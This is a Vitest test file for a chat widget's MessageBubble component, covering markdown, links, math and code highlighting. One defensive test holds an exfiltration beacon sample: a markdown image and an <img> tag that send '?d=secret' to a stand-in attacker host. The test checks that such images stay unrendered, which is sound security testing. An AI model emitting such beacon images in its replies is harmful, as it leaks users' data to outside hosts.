import { describe, it, expect } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import { MessageBubble } from "./MessageBubble";
import { looksLikeMath } from "./markdown-plugins";
import { markdownLink } from "@/api/sse-events";

describe("looksLikeMath", () => {
  it("is true only for a $$…$$ span", () => {
    expect(looksLikeMath("$$x^2$$")).toBe(true);
    expect(looksLikeMath("inline $$a+b$$ here")).toBe(true);
    expect(looksLikeMath("It costs $5 and $10 today")).toBe(false);
    expect(looksLikeMath("$x$")).toBe(false);
    expect(looksLikeMath("$$ $$")).toBe(false);
  });
});
import { ChatProvider } from "@/store/chat-store";
import type { ChatMessage } from "@/types";

function renderBubble(message: ChatMessage) {
  return render(
    <ChatProvider>
      <MessageBubble message={message} />
    </ChatProvider>,
  );
}

describe("MessageBubble", () => {
  it("renders user message content", () => {
    renderBubble({ id: "1", role: "user", content: "Hello", timestamp: 0 });
    expect(screen.getByText("Hello")).toBeInTheDocument();
  });

  it("renders agent message content", () => {
    renderBubble({ id: "2", role: "agent", content: "Hi there", timestamp: 0 });
    expect(screen.getByText("Hi there")).toBeInTheDocument();
  });

  it("renders markdown bold text in agent messages", () => {
    renderBubble({ id: "3", role: "agent", content: "This is **bold**", timestamp: 0 });
    const bold = screen.getByText("bold");
    expect(bold.tagName).toBe("STRONG");
  });

  it("applies user styling class", () => {
    const { container } = renderBubble({ id: "4", role: "user", content: "Hi", timestamp: 0 });
    expect(container.querySelector(".message--user")).toBeInTheDocument();
  });

  it("applies agent styling class", () => {
    const { container } = renderBubble({ id: "5", role: "agent", content: "Hi", timestamp: 0 });
    expect(container.querySelector(".message--agent")).toBeInTheDocument();
  });

  it("shows avatar with U for user and E for agent", () => {
    const { container } = renderBubble({ id: "6", role: "user", content: "Hi", timestamp: 0 });
    expect(container.querySelector(".message__avatar")?.textContent).toBe("U");
  });

  it("renders links in agent markdown", () => {
    renderBubble({ id: "7", role: "agent", content: "Visit [EDDI](https://eddi.labs.ai)", timestamp: 0 });
    const link = screen.getByRole("link", { name: "EDDI" });
    expect(link).toHaveAttribute("href", "https://eddi.labs.ai");
  });

  it("opens links in a new tab so the widget is not navigated away", () => {
    renderBubble({ id: "8", role: "agent", content: "[docs](https://eddi.labs.ai)", timestamp: 0 });
    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("renders a built applicationLink with a space and brackets as one link", () => {
    renderBubble({
      id: "17",
      role: "agent",
      content: markdownLink("See [docs]", "/help page(1)"),
      timestamp: 0,
    });
    const link = screen.getByRole("link", { name: "See [docs]" });
    expect(link).toHaveAttribute("href", "/help%20page(1)");
  });

  it("does not leak react-markdown's node prop onto the link", () => {
    renderBubble({ id: "15", role: "agent", content: "[docs](https://eddi.labs.ai)", timestamp: 0 });
    expect(screen.getByRole("link", { name: "docs" })).not.toHaveAttribute("node");
  });

  it("keeps same-page anchors and footnote references in the page", () => {
    renderBubble({
      id: "16",
      role: "agent",
      content: "See the [top](#top) and a note[^1].\n\n[^1]: The note.",
      timestamp: 0,
    });
    const anchors = screen.getAllByRole("link").filter((a) => a.getAttribute("href")?.startsWith("#"));
    expect(anchors.length).toBeGreaterThan(1);
    for (const a of anchors) {
      expect(a).not.toHaveAttribute("target");
    }
  });

  it("does not render an image the model put in its text", () => {
    // Markdown and raw HTML alike: a model-chosen image URL is a beacon.
    const { container } = renderBubble({
      id: "9",
      role: "agent",
      content:
        '![x](https://evil.example/p.png?d=secret) <img src="https://evil.example/q.png">',
      timestamp: 0,
    });
    expect(container.querySelector("img")).toBeNull();
  });

  it("renders designer-configured image output items", () => {
    const { container } = renderBubble({
      id: "10",
      role: "agent",
      content: "",
      images: [{ uri: "https://cdn.example/chart.png", alt: "Chart" }],
      timestamp: 0,
    });
    const img = container.querySelector("img");
    expect(img).toHaveAttribute("src", "https://cdn.example/chart.png");
    expect(img).toHaveAttribute("alt", "Chart");
    expect(screen.queryByText("No response")).not.toBeInTheDocument();
  });

  it("renders LaTeX with KaTeX", async () => {
    const { container } = renderBubble({
      id: "11",
      role: "agent",
      content: "Euler: $$e^{i\\pi} + 1 = 0$$",
      timestamp: 0,
    });
    // KaTeX is loaded on demand, the first time a message needs it.
    await waitFor(() => expect(container.querySelector(".katex")).not.toBeNull());
  });

  it("leaves dollar amounts alone — single dollars are not math", async () => {
    // With single-dollar math on, "$5 and $10" rendered the span between the
    // prices as a formula ("It costs 5and5 and 10 today").
    const { container } = renderBubble({
      id: "14",
      role: "agent",
      content: "It costs $5 and $10 today. $$x^2$$",
      timestamp: 0,
    });
    // Wait for the math chunk (the $$ span loads it), then check the prices.
    await waitFor(() => expect(container.querySelector(".katex")).not.toBeNull());
    expect(container.textContent).toContain("It costs $5 and $10 today.");
    expect(container.querySelectorAll(".katex")).toHaveLength(1);
  });

  it("highlights a fenced code block with a language", async () => {
    const { container } = renderBubble({
      id: "12",
      role: "agent",
      content: "```js\nconst x = 1;\n```",
      timestamp: 0,
    });
    await waitFor(() => expect(container.querySelector(".hljs-keyword")).not.toBeNull());
    expect(container.querySelector("code.hljs")).not.toBeNull();
  });

  it("leaves math and highlighting off when disabled", () => {
    const { container } = render(
      <MessageBubble
        message={{ id: "13", role: "agent", content: "$x$\n\n```js\nconst x = 1;\n```", timestamp: 0 }}
        enableMath={false}
        enableCodeHighlight={false}
      />,
    );
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".hljs-keyword")).toBeNull();
  });
});
